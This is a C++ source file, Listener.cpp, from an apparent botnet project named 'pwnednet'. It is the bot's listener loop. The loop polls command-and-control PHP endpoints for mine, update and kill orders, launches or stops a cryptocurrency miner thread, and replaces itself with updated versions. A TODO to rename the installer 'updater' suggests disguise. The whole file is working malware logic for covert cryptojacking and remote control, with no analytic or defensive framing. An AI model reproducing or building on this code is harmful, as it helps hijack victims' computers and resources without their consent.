//
//  Listener.cpp
//  pwnednet
//
/* TODO :
 * - Active check
 * - RENAME INSTALLER TO updater
 *
 *
 *
 */

#include "include.h"


string listenMine   = g_Commands + "mine.php?request";
string listenUpdate = g_Commands + "update.php?request";
string listenKill   = g_Commands + "kill.php?request";
string setActive    = g_Commands + "active.php?bot";


void *MiningThread(void *unused);

bool ShouldCreate_mThread   = true;
bool mThread_Created        = true;



void Bot::Listen() {
    
    int m_mThread;          // Mining thread
    pthread_t threads[5];
    
    for(int i = 0;  ;i++) {
        
        sleep(10); // increase this to every 60 secs

        // Find whats causing cpu spike on startup            
            
        con->WaitForConnection();
        
        
        bot->shouldmine = StringToBool(con->post(listenMine.c_str(), "command=mine"));
        sleep(2);
            
        bot->update     = StringToBool(con->post(listenUpdate.c_str(), "command=update"));
        sleep(2);
            
        bot->kill       = StringToBool(con->post(listenKill.c_str(), "command=kill"));
        sleep(1);
            
        if(bot->shouldmine)
        {
            mThread_Created  = false;
        }
        
        // Fix this :
        // Stop
        // Start
        // Stop
                
            
        if(bot->update) {
        
            bot->Update();
            sleep(2);
            // If the new bot is running the remove the old one
            if(DoesPIDExist(newfile.c_str()))
                RemoveOldBot();
            
        }
            
            
        if(bot->kill)
        {
            bot->Kill();
        }


        // Creates mining thread
        if(!mThread_Created && ShouldCreate_mThread)
        {
            m_mThread                 = pthread_create(&threads[0], NULL, MiningThread, (void *)1);

            mThread_Created         = true;
            ShouldCreate_mThread    = false;
            
            sleep(1);
            
        }
        

    }
    
    
}

void *MiningThread(void *unused) {
    
    sleep(1);
    
    for(;;) {
        
        sleep(1);
        
        if(bot->shouldmine) {
            
            if(ShouldKillMiner()) {
                KillMiner();
                continue;
            }
            
            if(!IsMining())
                bot->LoadMiner();
            
            
        } else if(!bot->shouldmine) {
            
            if(!ShouldKillMiner())
                continue;
            
            KillMiner();
            
            ShouldCreate_mThread = true;
            pthread_exit(NULL);
            
        }
        
    }
    
}



















